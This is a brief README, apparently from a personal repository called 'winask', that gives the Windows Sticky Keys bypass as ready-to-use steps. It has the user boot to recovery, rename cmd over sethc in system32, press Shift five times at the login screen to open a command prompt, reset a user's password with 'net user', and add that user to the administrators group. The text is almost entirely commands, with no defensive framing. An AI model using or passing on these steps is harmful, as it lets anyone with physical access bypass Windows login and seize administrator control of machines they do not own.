# winask
windows asker

# add user
* restart to firmware, ```[shift] + [click]``` on restart

* open ```cmd``` console
```
c:
cd \windows\system32
rename sethc sethc-2
rename cmd sethc
```
* rename ```sethc```, then rename ```cmd``` to ```sethc```

* press ```[shift]``` 5 times
```
net localgroup administrators
net user <username> *
```
* change password

* add a user to administrators
```
net localgroup administrators <username> /add
```

# end of line
nothing more here




